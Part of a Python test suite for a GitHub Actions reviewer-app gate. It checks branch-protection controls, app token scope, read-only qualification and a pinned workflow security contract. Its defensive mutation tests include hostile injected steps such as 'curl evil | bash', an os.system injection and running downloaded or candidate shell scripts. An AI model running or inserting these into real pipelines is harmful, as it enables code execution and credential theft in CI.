        app.pages=lambda path,key:[{'id':gate.REPOSITORY_ID,'full_name':gate.REPOSITORY}]
        return read,app,run,jobs,checks,identity
    def qualify(self, read, app):
        return gate.qualify_app(read,app,'c'*40,gate.APP_SLUG,'123')
    def test_main_readiness_no_writes_no_receipt_or_policy_enrollment_needed(self):
        read,app,*_=self.fixture()
        with patch.object(gate,'controls_snapshot',return_value={'controls_sha256':'hash','bypass_visibility':{'1':'redacted-or-unavailable'}}) as control_checks, patch.object(app,'request') as app_request:
            result=self.qualify(read,app)
        self.assertEqual(control_checks.call_count,2)
        self.assertTrue(all(call.kwargs=={'require_legacy':True} for call in control_checks.call_args_list))
        self.assertEqual(result['status'],'qualified-app-read-only')
        self.assertFalse(result['mutated'])
        self.assertEqual(result['revision'],'c'*40)
        self.assertEqual(result['bypass_visibility']['1'],'redacted-or-unavailable')
        app_request.assert_not_called()
    def test_current_readiness_is_explicit_readonly_and_requires_stable_successor_controls(self):
        read,app,*_=self.fixture()
        with patch.object(gate,'controls_snapshot',return_value={'controls_sha256':'current'}) as controls,patch.object(app,'request') as writes:
            result=gate.qualify_app(read,app,'c'*40,gate.APP_SLUG,'123',stage='current')
        self.assertEqual(result['qualification_stage'],'current')
        self.assertFalse(result['mutated'])
        self.assertEqual(controls.call_count,2)
        self.assertTrue(all(c.kwargs=={'require_successor_only':True} for c in controls.call_args_list))
        writes.assert_not_called()
        with patch.object(gate,'controls_snapshot',side_effect=[{'hash':'old'},{'hash':'new'}]),self.assertRaisesRegex(gate.Rejected,'controls moved'):
            gate.qualify_app(read,app,'c'*40,gate.APP_SLUG,'123',stage='current')
    def test_current_readiness_rejects_retired_checks_and_preserves_review_ci_floor(self):
        repo,rules,sets=APIAndControlsTests().controls()
        gate.validate_controls(repo,rules,sets,require_successor_only=True)
        for check in ({'context':'renamed','integration_id':4274739},
                      {'context':'pr-automation / verify','integration_id':15368}):
            changed=copy.deepcopy(rules);changed[0]['parameters']['required_status_checks'].append(check)
            with self.assertRaisesRegex(gate.Rejected,'retired controller'):
                gate.validate_controls(repo,changed,sets,require_successor_only=True)
        with self.assertRaisesRegex(gate.Rejected,'conflicting qualification'):
            gate.validate_controls(repo,rules,sets,require_legacy=True,require_successor_only=True)
        for defect in ('ci','review'):
            changed=copy.deepcopy(rules)
            if defect=='ci':changed[0]['parameters']['strict_required_status_checks_policy']=False
            else:
                next(r for r in changed if r['type']=='pull_request')['parameters']['dismiss_stale_reviews_on_push']=False
            with self.assertRaises(gate.Rejected):gate.validate_controls(repo,changed,sets,require_successor_only=True)
    def test_current_qualification_cli_still_requires_writer_off_and_qualification_flag(self):
        for qualify,enabled,accepted in (('false','false',False),('true','true',False),('true','false',True)):
            api=gate.API('fake');api.request=lambda path:{'object':{'sha':'c'*40}}
            env={'GITHUB_REPOSITORY':gate.REPOSITORY,'TRUSTED_WORKFLOW_SHA':'c'*40,'CI_READ_TOKEN':'fake',
                 'APP_TOKEN':'fake','APP_SLUG':gate.APP_SLUG,'APP_INSTALLATION_ID':'123',
                 'REVIEWER_APP_QUALIFY':qualify,'REVIEWER_APP_ENABLED':enabled}
            with patch.dict(gate.os.environ,env,clear=True),patch('sys.argv',['reviewer_app.py','--qualify-app','--qualification-stage','current']), \
                 patch.object(gate.subprocess,'check_output',return_value='c'*40),patch.object(gate,'API',return_value=api), \
                 patch.object(gate,'qualify_app',return_value={'mutated':False}) as qualification,patch('builtins.print'):
                if accepted:
                    gate.main();self.assertEqual(qualification.call_args.kwargs,{'stage':'current'})
                else:
                    with self.assertRaises(gate.Rejected):gate.main()
                    qualification.assert_not_called()
        with patch('sys.argv',['reviewer_app.py','--write','--pr','1','--qualification-stage','current']),self.assertRaisesRegex(gate.Rejected,'stage requires read-only'):
            gate.main()
    def test_main_receipt_and_all_new_shards_are_mandatory(self):
        for mutation in (lambda run,jobs,checks,i:i.update(base_sha='b'*40),
                         lambda run,jobs,checks,i:i.update(event='pull_request'),
                         lambda run,jobs,checks,i:i.update(workflow_sha='d'*40),
                         lambda run,jobs,checks,i:jobs.pop(3),
                         lambda run,jobs,checks,i:jobs[2].update(conclusion='skipped'),
                         lambda run,jobs,checks,i:checks['4']['app'].update(id=99),
                         lambda run,jobs,checks,i:run.update(conclusion='failure'),
                         lambda run,jobs,checks,i:run.update(head_branch='other')):
            read,app,run,jobs,checks,identity=self.fixture();mutation(run,jobs,checks,identity)
            with patch.object(gate,'controls_snapshot',return_value={}):
                with self.assertRaises(gate.Rejected):self.qualify(read,app)
    def test_main_movement_and_control_drift_reject(self):
        read,app,*_=self.fixture();original=read.request;calls=[]
        def request(path):
            if path.endswith('/git/ref/heads/main'):
                calls.append(path)
                return {'object':{'sha':('c' if len(calls)==1 else 'd')*40}}
            return original(path)
        read.request=request
        with patch.object(gate,'controls_snapshot',return_value={}):
            with self.assertRaisesRegex(gate.Rejected,'main moved'):self.qualify(read,app)
        read,app,*_=self.fixture()
        with patch.object(gate,'controls_snapshot',side_effect=[{'hash':'a'},{'hash':'b'}]):
            with self.assertRaisesRegex(gate.Rejected,'controls moved'):self.qualify(read,app)
    def test_invalid_token_scope_or_bot_or_outputs_reject(self):
        read,app,*_=self.fixture()
        with self.assertRaises(gate.Rejected):gate.validate_app_identity(read,app,'wrong','123')
        for installation in (None,'','0','unknown'):
            with self.assertRaises(gate.Rejected):gate.validate_app_identity(read,app,gate.APP_SLUG,installation)
        for repositories in ([],[{'id':gate.REPOSITORY_ID,'full_name':'other'}],
                             [{'id':gate.REPOSITORY_ID,'full_name':gate.REPOSITORY},{'id':99}]):
            app.pages=lambda *args:repositories
            with self.assertRaises(gate.Rejected):gate.validate_app_identity(read,app,gate.APP_SLUG,'123')
        read,app,*_=self.fixture();read.request=lambda path:{'id':999,'type':'Bot','login':gate.APP_SLUG+'[bot]'}
        with self.assertRaises(gate.Rejected):gate.validate_app_identity(read,app,gate.APP_SLUG,'123')
        read,app,*_=self.fixture();app.pages=lambda *args: (_ for _ in ()).throw(gate.Rejected('invalid token'))
        with self.assertRaisesRegex(gate.Rejected,'invalid token'):self.qualify(read,app)
    def test_qualification_cli_requires_separate_flag_and_writer_off(self):
        for qualify,enabled,accepted in (('false','false',False),('true','true',False),('true','false',True)):
            api=gate.API('fake');api.request=lambda path:{'object':{'sha':'c'*40}}
            env={'GITHUB_REPOSITORY':gate.REPOSITORY,'TRUSTED_WORKFLOW_SHA':'c'*40,
                 'CI_READ_TOKEN':'fake','APP_TOKEN':'fake','APP_SLUG':gate.APP_SLUG,
                 'APP_INSTALLATION_ID':'123','REVIEWER_APP_QUALIFY':qualify,'REVIEWER_APP_ENABLED':enabled}
            with patch.dict(gate.os.environ,env,clear=True), patch('sys.argv',['reviewer_app.py','--qualify-app']), \
                 patch.object(gate.subprocess,'check_output',return_value='c'*40), \
                 patch.object(gate,'API',return_value=api), patch.object(gate,'qualify_app',return_value={'mutated':False}) as qualification, \
                 patch('builtins.print'):
                if accepted:
                    gate.main();qualification.assert_called_once()
                else:
                    with self.assertRaises(gate.Rejected):gate.main()
                    qualification.assert_not_called()
    def test_writable_api_never_accepted_for_qualification(self):
        read,app,*_=self.fixture();app.writable=True
        with self.assertRaises(gate.Rejected):self.qualify(read,app)
    def test_history_only_owner_always_preserved_without_broadening_merge_rules(self):
        repo,rules,sets=APIAndControlsTests().controls()
        history=[dict(type=name,ruleset_id=2) for name in ('deletion','non_fast_forward')]
        extra=dict(id=2,enforcement='active',rules=[{'type':r['type']} for r in history],
                   bypass_actors=[dict(actor_id=5,actor_type='RepositoryRole',bypass_mode='always')])
        gate.validate_controls(repo,rules+history,sets+[extra])
        for change in ('app','extra_rule','merge_always'):
            badsets=copy.deepcopy(sets+[extra]);badrules=copy.deepcopy(rules+history)
            if change=='app':badsets[1]['bypass_actors'][0].update(actor_type='Integration',actor_id=gate.APP_ID)
            if change=='extra_rule':badsets[1]['rules'].append({'type':'pull_request'})
            if change=='merge_always':badsets[0]['bypass_actors']=[dict(actor_id=5,actor_type='RepositoryRole',bypass_mode='always')]
            with self.assertRaises(gate.Rejected):gate.validate_controls(repo,badrules,badsets)
    def test_public_runtime_notices_are_hashes_only(self):
        current,producer,receipt,_=fixture()
        notice_hash=gate.digest(b'private startup notice')
        producer['allowed_startup_notice_sha256']=[notice_hash]
        receipt['runtime']['startup_notice_sha256']=[notice_hash]
        gate.validate_receipt(receipt,producer,current,'e'*64,NOW)
        receipt['runtime']['startup_notices']=['private text']
        with self.assertRaises(gate.Rejected):gate.validate_receipt(receipt,producer,current,'e'*64,NOW)


# This is a security contract, not a workflow snapshot. Names, descriptions,
# comments, JSON formatting, and shell/Python whitespace are not pinned. The
# privileged execution surface, credential wiring and admission guards are closed.
class GitAncestryTests(unittest.TestCase):
    def test_deepens_until_common_ancestor_and_stops(self):
        calls=[];base='b'*40;head='a'*40
        def command(*args,**kwargs):
            calls.append((args,kwargs))
            if args[0]=='merge-base':return None if len(calls)==2 else (base+'\n').encode()
        self.assertEqual(gate.bounded_merge_base(command,base,head),base)
        self.assertEqual([args[3] for args,_ in calls if args[0]=='fetch'],['--depth=256','--depth=512'])
        self.assertTrue(all(kwargs=={'no_common_base_ok':True} for args,kwargs in calls if args[0]=='merge-base'))
    def test_missing_ancestry_is_bounded_and_other_errors_do_not_retry(self):
        calls=[]
        def absent(*args,**kwargs):calls.append(args);return None
        with self.assertRaisesRegex(gate.Rejected,'bounded review route'):gate.bounded_merge_base(absent,'b'*40,'a'*40)
        self.assertEqual(len(calls),10)
        self.assertEqual(calls[-2][3],'--depth=4096')
        calls=[]
        def broken(*args,**kwargs):calls.append(args);raise gate.Rejected('transport failure')
        with self.assertRaisesRegex(gate.Rejected,'transport failure'):gate.bounded_merge_base(broken,'b'*40,'a'*40)
        self.assertEqual(len(calls),1)

class WorkflowContractTests(unittest.TestCase):
    CHECKOUT='actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1'
    TOKEN='actions/create-github-app-token@64ab729a6294000f5aa4a4bc0b73d1f32bc45510'
    RECEIPT="github.event_name != 'workflow_dispatch' || inputs.mode == 'receipt'"
    QUALIFY="github.event_name == 'workflow_dispatch' && (inputs.mode == 'app' || inputs.mode == 'app-current')"
    WRITE="github.event_name != 'workflow_dispatch' && vars.REVIEWER_APP_ENABLED == 'true'"
    ADMIT="""github.repository == 'KleinPerkins/machine-monitor' &&
      ((github.event_name == 'workflow_dispatch' && github.ref == 'refs/heads/main') ||
       (github.event_name == 'issue_comment' && github.event.issue.pull_request &&
        github.event.sender.id == 49759187 && startsWith(github.event.comment.body, '<!-- g1-review-receipt:v1 -->')) ||
       (github.event_name == 'workflow_run' && github.event.workflow_run.event == 'pull_request' &&
        github.event.workflow_run.conclusion == 'success' &&
        github.event.workflow_run.head_repository.id == 1449284973))"""
    RESOLVE="""import json, os
event = json.load(open(os.environ['GITHUB_EVENT_PATH']))
kind = os.environ['GITHUB_EVENT_NAME']
if kind == 'issue_comment':
    number = event['issue']['number']
elif kind == 'workflow_run':
    prs = event['workflow_run']['pull_requests']
    if len(prs) != 1:
        raise SystemExit('Exactly one PR binding required; use read-only qualification for diagnosis')
    number = prs[0]['number']
else:
    number = int(event['inputs']['pr'])
if type(number) is not int or not 0 < number < 1000000000:
    raise SystemExit('Invalid PR number')
with open(os.environ['GITHUB_OUTPUT'], 'a') as output:
    output.write(f'pr={number}\\n')
"""
    def load(self,text=None):
        def unique(pairs):
            result={}
            for key,value in pairs:
                self.assertNotIn(key,result,'duplicate workflow key')
                result[key]=value
            return result
        return json.loads(text if text is not None else (gate.ROOT/'.github/workflows/reviewer-app.yml').read_text(),object_pairs_hook=unique)
    def condition(self,actual,expected):
        # Ignore expression layout while retaining grouping, literals, all guards
        # and the AND/OR relationship. This rejects `|| true` and comments/injections.
        self.assertEqual(' '.join(actual.split()),' '.join(expected.split()))
    def contract(self,w):
        self.assertIsInstance(w,dict)
        self.assertEqual(set(w),{'name','on','permissions','concurrency','jobs'})
        self.assertEqual(set(w['on']),{'issue_comment','workflow_run','workflow_dispatch'})
        self.assertEqual(w['on']['issue_comment'],{'types':['created']})
        self.assertEqual(w['on']['workflow_run'],{'workflows':['CI'],'types':['completed']})
        dispatch=w['on']['workflow_dispatch']
        self.assertEqual(set(dispatch),{'inputs'})
        self.assertEqual(set(dispatch['inputs']),{'mode','pr'})
        mode=dispatch['inputs']['mode'];pr=dispatch['inputs']['pr']
        self.assertEqual({k:v for k,v in mode.items() if k!='description'},
                         {'type':'choice','options':['receipt','app','app-current'],'default':'receipt'})
        self.assertEqual({k:v for k,v in pr.items() if k!='description'},{'type':'string','required':False})
        self.assertEqual(w['permissions'],{'contents':'read','actions':'read','checks':'read','pull-requests':'read'})
        self.assertEqual(w['concurrency'],{'group':'g1-reviewer-app','cancel-in-progress':False})
        self.assertEqual(set(w['jobs']),{'admit'})
        job=w['jobs']['admit']
        self.assertEqual(set(job),{'if','runs-on','timeout-minutes','steps'})
        self.assertEqual(job['runs-on'],'ubuntu-24.04')
        self.assertIs(type(job['timeout-minutes']),int)
        self.assertTrue(0<job['timeout-minutes']<=15)
        self.condition(job['if'],self.ADMIT)
        steps=job['steps'];self.assertEqual(len(steps),7)
        checkout,target,receipt,qual_token,qualify,app_token,write=steps
        # No extra uses/run/env/defaults/container/services are accepted. Thus no
        # local action, artifact download, candidate checkout or new shell can run.
        self.assertEqual(set(checkout),{'uses','with'})
        self.assertEqual(checkout['uses'],self.CHECKOUT)
        self.assertEqual(checkout['with'],{'ref':'${{ github.workflow_sha }}','persist-credentials':False,
            'sparse-checkout':'scripts/reviewer_app.py\n.github/review-enrollments.json\n','sparse-checkout-cone-mode':False})
        self.assertEqual(set(target)-{'name'},{'id','if','run'})
        self.assertEqual(target['id'],'target');self.condition(target['if'],self.RECEIPT)
        resolver=target['run'].splitlines()
        self.assertEqual(resolver[0],"python3 -I -B - <<'PY'");self.assertEqual(resolver[-1],'PY')
        self.assertNotIn('${{',target['run'])
        self.assertEqual(ast.dump(ast.parse('\n'.join(resolver[1:-1]))),ast.dump(ast.parse(self.RESOLVE)))
        ci_env={'CI_READ_TOKEN':'${{ github.token }}','TRUSTED_WORKFLOW_SHA':'${{ github.workflow_sha }}'}
        target_env={'TARGET_PR':'${{ steps.target.outputs.pr }}'}
        def execute(step,guard,args,env):
            self.assertEqual(set(step)-{'name'},{'if','env','run'})
            self.condition(step['if'],guard)
            self.assertEqual(step['env'],env)
            self.assertEqual(shlex.split(step['run']),['python3','-I','-B','scripts/reviewer_app.py']+args)
        execute(receipt,self.RECEIPT,['--pr','$TARGET_PR'],dict(ci_env,**target_env))
        def mint(step,identity,guard,permission):
            self.assertEqual(set(step)-{'name'},{'if','id','uses','with'})
            self.assertEqual(step['id'],identity);self.condition(step['if'],guard)
            self.assertEqual(step['uses'],self.TOKEN)
            self.assertEqual(step['with'],{'app-id':'4217367','private-key':'${{ secrets.AUTOMERGE_APP_PRIVATE_KEY }}',
                'owner':'KleinPerkins','repositories':'machine-monitor','permission-contents':permission,
                'permission-pull-requests':permission,'skip-token-revoke':False})
        mint(qual_token,'qualification',self.QUALIFY+" && vars.REVIEWER_APP_QUALIFY == 'true' && vars.REVIEWER_APP_ENABLED != 'true'",'read')
        mint(app_token,'app',self.WRITE,'write')
        def app_env(identity):
            return {key:'${{ steps.'+identity+'.outputs.'+output+' }}' for key,output in
                    (('APP_TOKEN','token'),('APP_SLUG','app-slug'),('APP_INSTALLATION_ID','installation-id'))}
        flags={'REVIEWER_APP_ENABLED':'${{ vars.REVIEWER_APP_ENABLED }}'}
        execute(qualify,self.QUALIFY,['--qualify-app','--qualification-stage','$QUALIFICATION_STAGE'],dict(ci_env,**app_env('qualification'),**flags,
            REVIEWER_APP_QUALIFY='${{ vars.REVIEWER_APP_QUALIFY }}',
            QUALIFICATION_STAGE="${{ inputs.mode == 'app-current' && 'current' || 'bootstrap' }}"))
        execute(write,self.WRITE,['--pr','$TARGET_PR','--write'],dict(ci_env,**app_env('app'),**flags,**target_env))
    def test_trusted_workflow_security_contract(self):
        self.contract(self.load())
    def test_invalid_scalar_and_duplicate_key_cannot_replace_workflow(self):
        for raw in ('this is invalid Actions YAML\n','"scalar"','[]','null','{"jobs":{},"jobs":{}}'):
            with self.subTest(raw=raw),self.assertRaises((AssertionError,ValueError)):
                self.contract(self.load(raw))
    def test_workflow_adversarial_mutations_reject(self):
        cases=[
            ('write-all token',lambda w:w.update(permissions='write-all')),
            ('job permissions',lambda w:w['jobs']['admit'].update(permissions={'contents':'write'})),
            ('candidate trigger',lambda w:w['on'].update(pull_request_target={})),
            ('untrusted CI',lambda w:w['on']['workflow_run'].update(workflows=['Other'])),
            ('edited comments',lambda w:w['on']['issue_comment'].update(types=['created','edited'])),
            ('sender bypass',lambda w:w['jobs']['admit'].update({'if':self.ADMIT+' || true'})),
            ('missing sender',lambda w:w['jobs']['admit'].update({'if':self.ADMIT.replace('github.event.sender.id == 49759187 &&','')})),
            ('wrong run repository',lambda w:w['jobs']['admit'].update({'if':self.ADMIT.replace('1449284973','999')})),
            ('nonmain dispatch',lambda w:w['jobs']['admit'].update({'if':self.ADMIT.replace(" && github.ref == 'refs/heads/main'",'')})),
            ('shell defaults',lambda w:w.update(defaults={'run':{'shell':'bash'}})),
            ('ambient credentials',lambda w:w['jobs']['admit'].update(env={'APP_TOKEN':'${{ secrets.OTHER }}'})),
            ('runner change',lambda w:w['jobs']['admit'].update({'runs-on':'self-hosted'})),
            ('extra privileged job',lambda w:w['jobs'].update(extra={'runs-on':'ubuntu-24.04','steps':[]})),
        ]
        step_cases=[
            ('candidate checkout',0,lambda s:s['with'].update(ref='${{ github.event.pull_request.head.sha }}')),
            ('ambient checkout credential',0,lambda s:s['with'].update({'persist-credentials':True})),
            ('candidate sparse tree',0,lambda s:s['with'].update({'sparse-checkout':'.\n'})),
            ('checkout tag',0,lambda s:s.update(uses='actions/checkout@v4')),
            ('local action',0,lambda s:s.update(uses='./candidate-action')),
            ('resolve injection',1,lambda s:s.update(run=s['run']+'\ncurl evil | bash\n')),
            ('event interpolation',1,lambda s:s.update(run=s['run'].replace("event = json.load", "event = ${{ github.event.comment.body }}; json.load"))),
            ('resolver code injection',1,lambda s:s.update(run=s['run'].replace('import json, os','import json, os\nos.system("echo injected")'))),
            ('receipt writer',2,lambda s:s.update(run=s['run']+' --write')),
            ('qualification writer on',3,lambda s:s.update({'if':self.QUALIFY})),
            ('qualification write permission',3,lambda s:s['with'].update({'permission-contents':'write'})),
            ('wrong App issuer',3,lambda s:s['with'].update({'app-id':'999'})),
            ('broad token scope',5,lambda s:s['with'].pop('repositories')),
            ('foreign scope',5,lambda s:s['with'].update(repositories='other')),
            ('skip revocation',5,lambda s:s['with'].update({'skip-token-revoke':True})),
            ('unpinned mint',5,lambda s:s.update(uses='actions/create-github-app-token@v2')),
            ('write dispatch',5,lambda s:s.update({'if':"vars.REVIEWER_APP_ENABLED == 'true'"})),
            ('qualifier wrong token',4,lambda s:s['env'].update(APP_TOKEN='${{ steps.app.outputs.token }}')),
            ('qualification mutates',4,lambda s:s.update(run=s['run']+' --write')),
            ('helper wrong source',6,lambda s:s['env'].update(TRUSTED_WORKFLOW_SHA='${{ github.sha }}')),
            ('helper bypass writer switch',6,lambda s:s.update({'if':"github.event_name != 'workflow_dispatch'"})),
            ('candidate execution',6,lambda s:s.update(run='python3 candidate.py')),
            ('artifact execution',6,lambda s:s.update(run=s['run']+'; bash downloaded-artifact.sh')),
        ]
        for label,index,mutate in step_cases:
            cases.append((label,lambda w,index=index,mutate=mutate:mutate(w['jobs']['admit']['steps'][index])))
        cases.append(('artifact download',lambda w:w['jobs']['admit']['steps'].append({'uses':'actions/download-artifact@'+'a'*40})))
        cases.append(('candidate appended shell',lambda w:w['jobs']['admit']['steps'].append({'run':'bash candidate.sh'})))
        for label,mutate in cases:
            with self.subTest(boundary=label):
                workflow=self.load();mutate(workflow)
                with self.assertRaises((AssertionError,SyntaxError,ValueError)):
                    self.contract(workflow)
    def test_nonsecurity_presentation_changes_are_allowed(self):
        workflow=self.load();workflow['name']='Renamed gate'
        workflow['jobs']['admit']['steps'][2]['name']='Receipt diagnosis'
        workflow['on']['workflow_dispatch']['inputs']['mode']['description']='Read-only mode'
        target=workflow['jobs']['admit']['steps'][1]
        target['run']=target['run'].replace('import json, os','import json, os  # formatting is not policy')
        workflow['jobs']['admit']['if']=self.ADMIT.replace(' &&','   &&')
        self.contract(self.load(json.dumps(workflow,indent=4)))

if __name__=='__main__':unittest.main()
